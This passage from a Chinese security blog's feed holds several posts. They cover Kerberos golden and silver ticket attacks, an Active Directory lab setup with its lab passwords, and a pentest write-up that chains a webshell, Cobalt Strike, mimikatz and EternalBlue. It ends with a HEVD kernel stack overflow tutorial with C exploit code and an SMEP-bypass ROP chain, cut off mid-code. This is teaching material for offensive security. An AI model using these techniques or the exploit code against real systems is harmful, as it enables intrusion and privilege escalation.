href="https://github.com/Xre0uS/MultiDump">https://github.com/Xre0uS/MultiDump</a></li></ul><p>获得管理员SID</p><ul><li>mimikatz一把梭</li><li><code>wmic useraccount get name,sid</code></li></ul><p>切换到域内用户的普通权限，制作黄金票据</p><p><img src="https://img.joe1sn.top/uploads/big/698af4ca909c2457fd7e9bfce63ee691.png" alt="image-20240223092136452" /></p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Ckerberos.assets%5Cimage-20240223095513608.png" alt="image-20240223095513608" /></p><p><img src="https://img.joe1sn.top/uploads/big/327782e54254105201209ef3d5936f2e.png" alt="image-20240223092217749" /></p><p><strong>横向移动</strong></p><p>先尝试访问文件夹</p><p><img src="https://img.joe1sn.top/uploads/big/f947a652d48ce2c94f6f5d9dd0888f94.png" alt="image-20240223095556996" /></p><p>原因：<a href="https://support.microsoft.com/zh-cn/topic/ms16-101-windows-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E7%A8%8B%E5%BA%8F%E8%AF%B4%E6%98%8E-2016-%E5%B9%B4-8-%E6%9C%88-9-%E6%97%A5-be16a40d-d7e2-c4b2-d885-6a22cff3cb77">https://support.microsoft.com/zh-cn/topic/ms16-101-windows-身份验证方法的安全更新程序说明-2016-年-8-月-9-日-be16a40d-d7e2-c4b2-d885-6a22cff3cb77</a></p><p><img src="https://img.joe1sn.top/uploads/big/f0814cff5a356db265a78fcdfb6ba1f3.png" alt="image-20240223095722593" /></p><p>貌似是WinServer2012的硬伤了，虚拟机必须用一些补丁才能用vmtools…</p><p><img src="https://img.joe1sn.top/uploads/big/5961dacc540e39be013e953ae0c28242.png" alt="image-20240223100706455" /></p><h2 id="白银票据"><a class="markdownIt-Anchor" href="#白银票据"></a> 白银票据</h2><p>需要知道Server的<code>HTLM-Hash</code></p><p>使用该值伪造TGT，在第七步中发送给Server</p><blockquote><p>但是在有些服务中并没有验证 PAC 这一步，这也是白银票据能成功的前提，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC，PAC 当然也验证不成功，但是有些服务不去验证 PAC，这是白银票据成功的前提。</p></blockquote><h2 id="ms14-06"><a class="markdownIt-Anchor" href="#ms14-06"></a> MS14-06</h2><p>问题出在第四步</p><p>KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;感恩学校扎实的密码学功底，分析起来也是很简单的&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>【内网】环境搭建</title>
    <link href="https://joe1sn.eu.org/2024/02/20/ad-dc-1/"/>
    <id>https://joe1sn.eu.org/2024/02/20/ad-dc-1/</id>
    <published>2024-02-20T13:56:00.000Z</published>
    <updated>2024-02-22T15:55:27.162Z</updated>
    
    <content type="html"><![CDATA[<p>Windows Server 2012 配置</p><p>怀念大学时光，在学网络配置的时候就是用的winserver 2012，最近想探究内网就翻出来学一学。</p><span id="more"></span><h1 id="简单配置"><a class="markdownIt-Anchor" href="#简单配置"></a> 简单配置</h1><p>vmware虚拟机安装就不多说了，主要是网络，我配置了两块网卡</p><p><img src="https://img.joe1sn.top/uploads/big/04324c8189d171f96dc2af621b154b5a.png" alt="image-20240220154255996" /></p><ul><li>NAT：连接到物理机网络</li><li>WinDC：构建vmware的虚拟局域网</li></ul><p><strong>关于vmtool安装</strong></p><p>vmtool是通过DVD光盘的形式安装的，所以要开启自动检测；软盘也要相同的设置</p><p><img src="https://img.joe1sn.top/uploads/big/424cb1a1752ec50eba2a9cddfa3ddafe.png" alt="image-20240220154438580" /></p><p><img src="https://img.joe1sn.top/uploads/big/1a3e734f5f1f39c70b37396988f728d2.png" alt="image-20240220194750242" /></p><p>装完了过后就很方便了</p><p><img src="https://img.joe1sn.top/uploads/big/b7052e36191aa37e0444c49b8db6dca4.png" alt="image-20240220195029170" /></p><p><strong>关闭防火墙</strong></p><p><img src="https://img.joe1sn.top/uploads/big/5ebdfad64ee12e608fd34888552774de.png" alt="image-20240220201714316" /></p><p><strong>开启远程桌面</strong></p><p><img src="https://img.joe1sn.top/uploads/big/a2c2806a73493336ff584dc89b1a2e90.png" alt="image-20240220201937426" /></p><p><strong>配置路由</strong></p><p>添加角色和功能 里面选择</p><p><img src="https://img.joe1sn.top/uploads/big/7ac5e3f9094228bfc9673c683f0ac16f.png" alt="image-20240220205319110" /></p><p><img src="https://img.joe1sn.top/uploads/big/9e953a19d0ec998318f4991715cfbcb0.png" alt="image-20240220205428596" /></p><p><img src="https://img.joe1sn.top/uploads/big/6c049825d969901eeb7d04a8ea0ea238.png" alt="image-20240220205529418" /></p><p><img src="https://img.joe1sn.top/uploads/big/eda3b70f4cfe8af3331a3c61a7b73d27.png" alt="image-20240220205544547" /></p><p><img src="https://img.joe1sn.top/uploads/big/260d8fe5e6ffd4dca14a1f78eb264fa9.png" alt="image-20240220210335831" /></p><p><strong>配置DHCP服务器</strong>（非必要）</p><p>添加角色和功能 里面选择</p><p><img src="https://img.joe1sn.top/uploads/big/60c32189c75a45fb849679e54137826e.png" alt="image-20240220202957415" /></p><p>创建和激活作用域：工具-&gt;DHCP</p><p><img src="https://img.joe1sn.top/uploads/big/e192caa4fad9f4ec4579b2e2f4274107.png" alt="image-20240220203415473" /></p><p><img src="https://img.joe1sn.top/uploads/big/104146589d90251c8145eb47a01ada16.png" alt="image-20240220203453553" /></p><p><img src="https://img.joe1sn.top/uploads/big/fa701127705cf339948c583f2c3c49b1.png" alt="image-20240220203613597" /></p><p><img src="https://img.joe1sn.top/uploads/big/2f7b9deb52c720b87d605b4561725d27.png" alt="image-20240220203727375" /></p><h1 id="ad活动目录配置"><a class="markdownIt-Anchor" href="#ad活动目录配置"></a> AD活动目录配置</h1><p><img src="https://img.joe1sn.top/uploads/big/eac3a65542cc3da641082bbd50d83a10.png" alt="image-20240220195749097" /></p><p>AD和域控制器DC都在虚拟机上。<br />为了测试，安排一个Win7</p><p>局域网</p><p><img src="https://img.joe1sn.top/uploads/big/0d0f7731366a3337957506b417e30933.png" alt="image-20240220203525303" /></p><h2 id="windows-7客户机"><a class="markdownIt-Anchor" href="#windows-7客户机"></a> Windows 7客户机</h2><p><img src="https://img.joe1sn.top/uploads/big/3d238e27f7cb3b5fb8df8863ee4374c6.png" alt="image-20240220200259734" /></p><p>配置内网静态IP，设置DNS为域服务器IP</p><p><img src="https://img.joe1sn.top/uploads/big/bbb70a67886e721cc74c6746623e6575.png" alt="image-20240220210343006" /></p><h2 id="配置dc域控"><a class="markdownIt-Anchor" href="#配置dc域控"></a> 配置DC域控</h2><p><img src="https://img.joe1sn.top/uploads/big/cbc81c44aff72d5b8e8b7d18d2cd2fe6.png" alt="image-20240220210858648" /></p><p><strong>提升为域控制器</strong></p><p><img src="https://img.joe1sn.top/uploads/big/1e6d4c92b519dcb5f4a6125a36b5e836.png" alt="image-20240220211100722" /></p><p><img src="https://img.joe1sn.top/uploads/big/546c8b3c9e8ca6018510adc83bad0f17.png" alt="image-20240220211450090" /></p><p><img src="https://img.joe1sn.top/uploads/big/a5ab50bd868ad0264bc9ee1aa7a8b2be.png" alt="image-20240220211640177" /></p><p>密码：<code>!234rewq</code></p><p><img src="https://img.joe1sn.top/uploads/big/a87cf749a0ba22a28bcf755db19d187c.png" alt="image-20240220212039995" /></p><p>设置Administrator账户的密码为<code>$321qwer</code></p><h2 id="创建用户组织"><a class="markdownIt-Anchor" href="#创建用户组织"></a> 创建用户组织</h2><p>用户组织可以用于委派等，是对组操作的最小单位</p><p>使用部门-&gt;个人的划分</p><p>这里就设置为 <code>UserA</code>部门的<code>Alan</code>用户</p><p><img src="https://img.joe1sn.top/uploads/big/74fa13cac064d4b1623ddb18a66a0bae.png" alt="image-20240220212755948" /></p><p><img src="https://img.joe1sn.top/uploads/big/6ed53ccc43e8bb241b11bc9b7658bd37.png" alt="image-20240220213049949" /></p><p><img src="https://img.joe1sn.top/uploads/big/f37a54fbc11da01b70da17e4d5957c1c.png" alt="image-20240220213109593" /></p><p><img src="https://img.joe1sn.top/uploads/big/a26d08f2359c87d97dfad4e5976e8c55.png" alt="image-20240220213212092" /></p><p>密码：<code>!234rewq</code></p><h2 id="将用户添加到域"><a class="markdownIt-Anchor" href="#将用户添加到域"></a> 将用户添加到域</h2><p>检查域名解析</p><p><img src="https://img.joe1sn.top/uploads/big/f2d80c060501a96285d6e6c33ba88e87.png" alt="image-20240220213627950" /></p><p><img src="https://img.joe1sn.top/uploads/big/ad76a4cdefc82a3ead58744b9599b6f4.png" alt="image-20240220213649517" /></p><p><img src="https://img.joe1sn.top/uploads/big/1f48004c0d40293e57624da50613bd75.png" alt="image-20240220213719961" /></p><p><img src="https://img.joe1sn.top/uploads/big/0c5e940d0e5158199d238db35f324a0f.png" alt="image-20240220213754894" /></p><p>不能直接登录Alan的账户（因为是首次登陆），先登一次Admin的</p><p><img src="https://img.joe1sn.top/uploads/big/7249f4c2ace34c411aff0fdaf6246513.png" alt="image-20240220214022822" /></p><p>然后重新设置该客户端的账户和密码</p><p><img src="https://img.joe1sn.top/uploads/big/bf81843006e9515607e3528e9f9e21eb.png" alt="image-20240220214055242" /></p><p><img src="https://img.joe1sn.top/uploads/big/a61dc6e9db5de22f4e7e9f78af086276.png" alt="image-20240220214152900" /></p><p><img src="https://img.joe1sn.top/uploads/big/5d721ffcf3e62cd34603c41a2de86bbf.png" alt="image-20240220214401452" /></p><p><img src="https://img.joe1sn.top/uploads/big/f7fd8920af990f0611fd2b43f8da47b5.png" alt="image-20240220214553806" /></p><h1 id="密码汇总"><a class="markdownIt-Anchor" href="#密码汇总"></a> 密码汇总</h1><table><thead><tr><th>账户</th><th>密码</th><th>备注</th></tr></thead><tbody><tr><td>administrator</td><td>$321qwer</td><td>域管理员</td></tr><tr><td>Alan</td><td>!234rewq</td><td>首次登陆</td></tr><tr><td>Alan</td><td>$321qwer</td><td>首次登陆后更改密码</td></tr><tr><td>WinDC</td><td>1qazxsw@</td><td></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows Server 2012 配置&lt;/p&gt;
&lt;p&gt;怀念大学时光，在学网络配置的时候就是用的winserver 2012，最近想探究内网就翻出来学一学。&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="pentest" scheme="https://joe1sn.eu.org/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>【内网】内网渗透测试-新手村</title>
    <link href="https://joe1sn.eu.org/2024/02/15/intranet/"/>
    <id>https://joe1sn.eu.org/2024/02/15/intranet/</id>
    <published>2024-02-15T02:58:20.000Z</published>
    <updated>2024-02-20T14:01:05.374Z</updated>
    
    <content type="html"><![CDATA[<p>简单一层内网测试</p><p>去年的一篇，简单一层内网测试</p><span id="more"></span><h2 id="入口点"><a class="markdownIt-Anchor" href="#入口点"></a> 入口点</h2><p>http://xxx:16xx8</p><p>入口是个OA办公系统，使用某漏洞可以文件上传最后webshell实现RCE</p><p>扫描内网发现存活主机，同时上传cs大马</p><p><img src="https://img.joe1sn.top/uploads/big/55f5c2cddd5ddff8ad695c8f5df1b1d7.png" alt="img" /></p><p>使用mimikatz抓取明文得到rdp密码后使用socks代理进入内网可以访问远程桌面</p><h2 id="内网i-监控服务器"><a class="markdownIt-Anchor" href="#内网i-监控服务器"></a> 内网I 监控服务器</h2><p>192.168.xx.50</p><p>该服务器存在ms17-010漏洞，但是有杀软，尝试使用psexec文件上传执行RCE失败，因为被杀软拦截了，可能修改横向移动方式能够绕过</p><p>也可以尝试使用command一句话+web_delivery上线</p><p>不过好在入口权限够高，192.168.xx.100时也扫出了RDP密码，也是直接上线了</p><h2 id="内网ii-dhcp服务器"><a class="markdownIt-Anchor" href="#内网ii-dhcp服务器"></a> 内网II DHCP服务器</h2><p>192.168.xx.250</p><p>一般来说DHCP服务器是域服务器，mimikatz没有抓到密码，不过还好有ms17-010漏洞，但是由于当时我没有使用正向payload所以使用的就是 web_delivery+command 上线，之后把msf的shell传递给cs来扫密码，得到密码后使用代理RDP上线</p><p>查看相关配置后基本可以肯定就是内网AD域控服务器</p><p><img src="https://img.joe1sn.top/uploads/big/566885954f29e1e98f1bab9911605446.png" alt="img" /></p><h2 id="内网iii-路由器网关"><a class="markdownIt-Anchor" href="#内网iii-路由器网关"></a> 内网III 路由器网关</h2><p>192.168.xx.1</p><p>H3C的交换机 没有打下来</p><p><img src="https://img.joe1sn.top/uploads/big/8404f28f220ea986709e01a38b3537b4.png" alt="img" /></p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p><img src="https://img.joe1sn.top/uploads/big/276c06c1487481940bcf90703a512cfa.png" alt="image-20230215113845307" /></p><p>单层内网，结构简单，没有不出网的内网机器，新手村难度</p><p>基本全靠永恒之蓝+mimikatz，算是熟悉了工具和流程</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单一层内网测试&lt;/p&gt;
&lt;p&gt;去年的一篇，简单一层内网测试&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="pentest" scheme="https://joe1sn.eu.org/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出(下)</title>
    <link href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/"/>
    <id>https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-III/</id>
    <published>2024-01-25T07:07:41.000Z</published>
    <updated>2024-02-24T03:52:04.469Z</updated>
    
    <content type="html"><![CDATA[<hr /><p>上：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-I/</a></p><p>中：<a href="https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/">https://joe1sn.eu.org/2024/01/25/win-hevd-exp-stackoverflow-II/</a></p><p>文章已在先知社区投稿：<a href="https://xz.aliyun.com/t/13365">https://xz.aliyun.com/t/13365</a></p><p>本附录对第二章的以下几个遗留问题做出说明</p><ul><li>user编程寻找ROPGadget</li><li>shellcode编写</li><li>Token提权</li><li>KVAS</li></ul><span id="more"></span><h1 id="user编程寻找ropgadget"><a class="markdownIt-Anchor" href="#user编程寻找ropgadget"></a> user编程寻找ROPGadget</h1><p>ROP全称加返回导向性编程，比如这一章用到的Gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rcx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">mov cr4, rcx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>关于<code>ret</code>汇编本质上就是从栈帧中取出值，然后将<code>ip</code>寄存器设置为该值，等价于<code>pop ip</code>，这样就能完成函数调用的返回等等。</p><p>本章中当我们发生栈溢出时，就会把<code>ret</code>的位置设置为第一段gadget的位置</p><ul><li><code>pop rcx</code>就会将此时栈顶的值<code>0x00000000002506f8</code>存入<code>rcx</code>寄存器，然后<code>ret</code>又从栈顶取出地址<code>mov_rc4_rcx_ret</code>，然后<code>rip</code>寄存器就跳转执行了</li><li><code>mov rc4, rcx</code>将<code>rcx</code>值存入<code>rc4</code>中然后<code>ret</code>又将栈顶的值<code>shellcode_addr</code>设置为<code>rip</code>寄存器的值后返回</li></ul><p>细心一点就会发现本章截图中的地址不一样，因为内核加载时的内存虚拟地址也是随机化的，不过寻址方式依旧是<code>基地址</code>+<code>偏移</code></p><p>这就引申出函数第一段代码：找到内核的基地址</p><h2 id="a找到内核基地址"><a class="markdownIt-Anchor" href="#a找到内核基地址"></a> A.找到内核基地址</h2><p>通过<code>NtQuerySystemInformation </code>这个“半隐藏”函数实现的</p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in, out] SystemInformation</span><br></pre></td></tr></table></figure><p>指向接收请求信息的缓冲区的指针。 此信息的大小和结构因 <em>SystemInformationClass</em> 参数的值而异：</p></blockquote><p>很可惜，关于<code>SystemInformationClass</code>微软并没有公开它的设计，网上有很多关于此的资料</p><p><code>SYSTEM_INFORMATION_CLASS</code>：<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm</a></p><p>他是一个枚举，其中<code>0xB</code>就代表着要查询的是<code>SystemModuleInformation</code></p><p><code>SYSTEM_MODULE</code>：<a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html">http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FSYSTEM_MODULE.html</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_MODULE</span> &#123;</span><br><span class="line">  ULONG                Reserved1;</span><br><span class="line">  ULONG                Reserved2;</span><br><span class="line">  PVOID                ImageBaseAddress;</span><br><span class="line">  ULONG                ImageSize;</span><br><span class="line">  ULONG                Flags;</span><br><span class="line">  WORD                 Id;</span><br><span class="line">  WORD                 Rank;</span><br><span class="line">  WORD                 w018;</span><br><span class="line">  WORD                 NameOffset;</span><br><span class="line">  BYTE                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125; SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br></pre></td></tr></table></figure><p><code>SystemInformation</code>就是由<code>SYSTEM_MODULE</code>数组作为成员的结构体，这个没有官方文档，也是通过逆向得到的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">ULONG                ModulesCount;</span><br><span class="line">SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure><p>关于查询函数的定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span></span>;</span><br></pre></td></tr></table></figure><ol><li>首先从<code>ntdll</code>导入函数</li><li>然后初始化变量</li><li>查询后打印并返回，如果没有查到就返回0</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulGetKernelBase</span><span class="params">(PCHAR ModuleName)</span> </span>&#123;</span><br><span class="line">PVOID kernelImageBase = <span class="literal">NULL</span>;</span><br><span class="line">PCHAR kernelImage = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//import function `NtQuerySystemInformation`</span></span><br><span class="line">HMODULE ntdll = <span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;ntdll&quot;</span>));</span><br><span class="line">PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(ntdll, <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] GetProcAddress() failed.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//init length</span></span><br><span class="line">ULONG len = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;len);</span><br><span class="line"><span class="comment">//init module infomations</span></span><br><span class="line">PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)<span class="built_in">GlobalAlloc</span>(GMEM_ZEROINIT, len);</span><br><span class="line"><span class="keyword">if</span> (pModuleInfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase]  Could not allocate memory for module info.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//starting quering</span></span><br><span class="line">NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation, pModuleInfo, len, &amp;len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] [ulGetKernelBase] NtQuerySystemInformation failed with error code 0x%X\n&quot;</span>, status);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; pModuleInfo-&gt;ModulesCount; i++) &#123;</span><br><span class="line">kernelImage = (PCHAR)pModuleInfo-&gt;Modules[i].Name;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(kernelImage, ModuleName)) &#123;</span><br><span class="line">kernelImageBase = pModuleInfo-&gt;Modules[i].ImageBaseAddress;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] [ulGetKernelBase]  Mod name %s &quot;</span>, kernelImage);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%llx\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Base Addr 0x%X\r\n&quot;</span>, kernelImageBase);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)kernelImageBase;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="b-找到对应汇编"><a class="markdownIt-Anchor" href="#b-找到对应汇编"></a> B. 找到对应汇编</h2><p>可以使用CTF常用工具<code>ROPGadget</code>，他支持<code>PE</code>格式（因为用的Capstone反汇编引擎）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./HEVD.sys --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure><p>试试<code>ntoskrl.exe</code>的</p><p><img src="https://img.joe1sn.top/uploads/big/5932a20543fd1420ae321f901e1f4c44.png" alt="image-20240119172454699" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000014039eb47 : mov cr4, rcx ; ret</span><br></pre></td></tr></table></figure><p>得到基地址是<code>0x39eb47</code>，另外一个gadget同理</p><p>重写修改下EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> pop_rcx = base+ <span class="number">0x20C64C</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mov_cr4_rcx = base+ <span class="number">0x39eb47</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx;</span><br><span class="line"><span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_cr4_rcx;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/14da4b6cf8f39c3a16855b7a20fbf476.png" alt="image-20240119174839482" /></p><p><img src="https://img.joe1sn.top/uploads/big/6c94aaf54fc86ee593668486a2df81a4.png" alt="image-20240119174924327" /></p><p>一些常见的gadget字节序列</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">&quot;RET&quot;</span> , &#123; <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0xC3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RCX&quot;</span>, &#123; <span class="number">0x59</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;MOV_CR4_RCX&quot;</span>, &#123; <span class="number">0x0f</span>, <span class="number">0x22</span>, <span class="number">0xe1</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line"></span><br><span class="line">&#123; <span class="string">&quot;NOP&quot;</span>, &#123; <span class="number">0x4d</span>, <span class="number">0xc3</span> &#125;&#125;,</span><br><span class="line">&#123; <span class="string">&quot;POP_RAX_POP_RCX&quot;</span>, &#123; <span class="number">0x58</span>, <span class="number">0x59</span>, <span 